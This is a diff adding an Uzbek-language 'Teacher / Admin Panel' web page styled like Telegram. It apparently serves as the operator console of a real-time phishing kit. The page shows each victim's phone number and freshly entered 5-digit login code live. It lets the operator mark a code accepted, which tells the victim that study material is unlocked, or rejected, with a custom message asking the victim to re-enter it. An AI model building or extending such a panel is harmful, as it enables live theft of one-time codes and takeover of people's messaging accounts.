@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ustoz / Admin Paneli</title>
+    <style>
+        :root {
+            --bg-color: #0f1721;
+            --surface-color: #17212b;
+            --card-bg: #1e2c3d;
+            --border-color: #2c3e52;
+            --primary: #3390ec;
+            --primary-hover: #2b7ecb;
+            --success: #4fae60;
+            --success-hover: #439a53;
+            --danger: #e53935;
+            --danger-hover: #c62828;
+            --text-primary: #ffffff;
+            --text-secondary: #8ea5bc;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .admin-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            width: 100%;
+            max-width: 480px;
+            padding: 28px;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.5);
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 24px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .title {
+            font-size: 18px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .badge-live {
+            background: rgba(79, 174, 96, 0.15);
+            color: var(--success);
+            border: 1px solid var(--success);
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .pulse-dot {
+            width: 7px;
+            height: 7px;
+            background: var(--success);
+            border-radius: 50%;
+            box-shadow: 0 0 8px var(--success);
+        }
+
+        .status-box {
+            background: #141f2c;
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+
+        .field-label {
+            font-size: 12px;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 6px;
+        }
+
+        .field-phone {
+            font-size: 16px;
+            font-weight: 600;
+            color: #ffffff;
+            margin-bottom: 14px;
+        }
+
+        .code-display {
+            font-size: 40px;
+            font-weight: 800;
+            font-family: "Cascadia Code", Consolas, monospace;
+            letter-spacing: 6px;
+            color: #3390ec;
+            margin: 10px 0;
+            padding: 12px;
+            background: #0d151e;
+            border-radius: 10px;
+            border: 1px dashed #2c3e52;
+            transition: all 0.25s ease;
+        }
+
+        .code-display.has-code {
+            color: #4fae60;
+            border-color: #4fae60;
+            box-shadow: 0 0 15px rgba(79, 174, 96, 0.2);
+        }
+
+        .state-text {
+            font-size: 13px;
+            color: var(--text-secondary);
+            margin-top: 8px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            margin-bottom: 8px;
+            color: var(--text-secondary);
+        }
+
+        .custom-msg-input {
+            width: 100%;
+            background: #141f2c;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 10px 14px;
+            color: #ffffff;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .custom-msg-input:focus {
+            border-color: var(--primary);
+        }
+
+        .action-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+
+        .btn {
+            padding: 14px;
+            border-radius: 10px;
+            border: none;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: all 0.2s ease;
+        }
+
+        .btn-approve {
+            background: var(--success);
+            color: #ffffff;
+        }
+
+        .btn-approve:hover {
+            background: var(--success-hover);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 15px rgba(79, 174, 96, 0.3);
+        }
+
+        .btn-reject {
+            background: var(--danger);
+            color: #ffffff;
+        }
+
+        .btn-reject:hover {
+            background: var(--danger-hover);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 15px rgba(229, 57, 53, 0.3);
+        }
+
+        .btn-reset {
+            width: 100%;
+            background: #243447;
+            color: #a2b5c7;
+            padding: 10px;
+            font-size: 13px;
+        }
+
+        .btn-reset:hover {
+            background: #2c3e54;
+            color: #ffffff;
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%) translateY(30px);
+            background: #232e3c;
+            color: #ffffff;
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-size: 13px;
+            opacity: 0;
+            transition: all 0.25s ease;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.5);
+            pointer-events: none;
+        }
+
+        .toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="admin-card">
+        <div class="header">
+            <div class="title">
+                <span>👑 Ustoz / Admin Paneli</span>
+            </div>
+            <div class="badge-live">
+                <span class="pulse-dot"></span>
+                <span>REAL-TIME</span>
+            </div>
+        </div>
+
+        <div class="status-box">
+            <div class="field-label">Foydalanuvchi telefoni:</div>
+            <div class="field-phone" id="userPhoneDisplay">Hali kiritilmadi</div>
+
+            <div class="field-label">Kiritilgan 5 xonali kod:</div>
+            <div class="code-display" id="userCodeDisplay">-----</div>
+
+            <div class="state-text" id="statusDescText">Talabaning harakati kutilmoqda...</div>
+        </div>
+
+        <div class="input-group">
+            <label class="input-label" for="customMsgInput">Xatolik xabari (Agar rad etilsa):</label>
+            <input type="text" id="customMsgInput" class="custom-msg-input" value="Kodni qayta kiriting! (Admin tomonidan rad etildi)">
+        </div>
+
+        <div class="action-grid">
+            <button class="btn btn-approve" id="btnApprove">
+                <span>✅ Toʻgʻri (Ochish)</span>
+            </button>
+            <button class="btn btn-reject" id="btnReject">
+                <span>❌ Qayta kiriting</span>
+            </button>
+        </div>
+
+        <button class="btn btn-reset" id="btnReset">Qaytadan boshlash (Reset)</button>
+    </div>
+
+    <div id="toast" class="toast"></div>
+
+    <script>
+        const userPhoneDisplay = document.getElementById('userPhoneDisplay');
+        const userCodeDisplay = document.getElementById('userCodeDisplay');
+        const statusDescText = document.getElementById('statusDescText');
+        const customMsgInput = document.getElementById('customMsgInput');
+        const btnApprove = document.getElementById('btnApprove');
+        const btnReject = document.getElementById('btnReject');
+        const btnReset = document.getElementById('btnReset');
+        const toast = document.getElementById('toast');
+
+        // Real-time brauzerlararo kanal (BroadcastChannel)
+        const channel = window.BroadcastChannel ? new BroadcastChannel('phone_auth_channel') : null;
+
+        function showToast(msg) {
+            toast.textContent = msg;
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 2800);
+        }
+
+        function updateUI(state) {
+            if (!state) return;
+            if (state.phone) userPhoneDisplay.textContent = state.phone;
+            if (state.code) {
+                userCodeDisplay.textContent = state.code;
+                userCodeDisplay.classList.add('has-code');
+            } else {
+                userCodeDisplay.textContent = '-----';
+                userCodeDisplay.classList.remove('has-code');
+            }
+
+            if (state.status === 'CODE_SUBMITTED') {
+                statusDescText.innerHTML = '<b style="color: #3390ec;">🔔 Yangi kod keldi! Qaror qabul qiling:</b>';
+            } else if (state.status === 'APPROVED') {
+                statusDescText.innerHTML = '<b style="color: #4fae60;">✅ Qabul qilindi! Material ochildi.</b>';
+            } else if (state.status === 'REJECTED') {
+                statusDescText.innerHTML = '<b style="color: #e53935;">❌ Rad etildi (Qayta kiritish soʻraldi).</b>';
+            } else if (state.status === 'PHONE_ENTERED') {
+                statusDescText.textContent = 'Foydalanuvchi telefon kiritdi, kod yozmoqda...';
+            }
+        }
+
+        // 1. BroadcastChannel orqali qabul qilish
+        if (channel) {
+            channel.onmessage = (e) => {
+                if (e.data && e.data.type === 'USER_SUBMIT_CODE') {
+                    updateUI({
+                        phone: e.data.phone,
+                        code: e.data.code,
+                        status: 'CODE_SUBMITTED'
+                    });
+                    showToast(`Yangi kod keldi: ${e.data.code}`);
+                }
+            };
+        }
+
+        // 2. localStorage orqali qabul qilish
+        window.addEventListener('storage', (e) => {
+            if (e.key === 'auth_session_state' && e.newValue) {
+                try {
+                    const state = JSON.parse(e.newValue);
+                    updateUI(state);
+                } catch(err) {}
+            }
+        });
+
+        // 3. Server API orqali so'rash (agar server bo'lsa)
+        async function fetchServerStatus() {
+            try {
+                const res = await fetch('/api/status');
+                if (res.ok) {
+                    const state = await res.json();
+                    updateUI(state);
+                }
+            } catch(e) {}
+        }
+        setInterval(fetchServerStatus, 1000);
+
+        // Qaror jo'natish funksiyasi
+        async function sendDecision(action, msg) {
+            const state = {
+                action: action,
+                message: msg,
+                status: action === 'APPROVE' ? 'APPROVED' : (action === 'REJECT' ? 'REJECTED' : 'IDLE'),
+                phone: userPhoneDisplay.textContent,
+                code: userCodeDisplay.textContent,
+                timestamp: Date.now()
+            };
+
+            // a) BroadcastChannel
+            if (channel) {
+                channel.postMessage({ type: 'ADMIN_DECISION', ...state });
+            }
+
+            // b) localStorage
+            localStorage.setItem('auth_admin_decision', JSON.stringify(state));
+
+            // c) Server API
+            try {
+                await fetch('/api/admin-action', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ action, message: msg })
+                });
+            } catch(e) {}
+
+            updateUI(state);
+            showToast(action === 'APPROVE' ? 'Material ochildi!' : 'Qayta kiritish yuborildi');
+        }
+
+        btnApprove.addEventListener('click', () => {
+            sendDecision('APPROVE', 'Toʻgʻri! Material ochildi.');
+        });
+
+        btnReject.addEventListener('click', () => {
+            const msg = customMsgInput.value.trim() || 'Kodni qayta kiriting!';
+            sendDecision('REJECT', msg);
+        });
+
+        btnReset.addEventListener('click', () => {
+            sendDecision('RESET', 'Qaytadan boshlandi');
+            userPhoneDisplay.textContent = 'Hali kiritilmadi';
+            userCodeDisplay.textContent = '-----';
+            userCodeDisplay.classList.remove('has-code');
+            statusDescText.textContent = 'Talabaning harakati kutilmoqda...';
+        });
+
+        // Dastlabki holat
+        const saved = localStorage.getItem('auth_session_state');
+        if (saved) {
+            try { updateUI(JSON.parse(saved)); } catch(e) {}
+        }
+    </script>
+</body>
+</html>
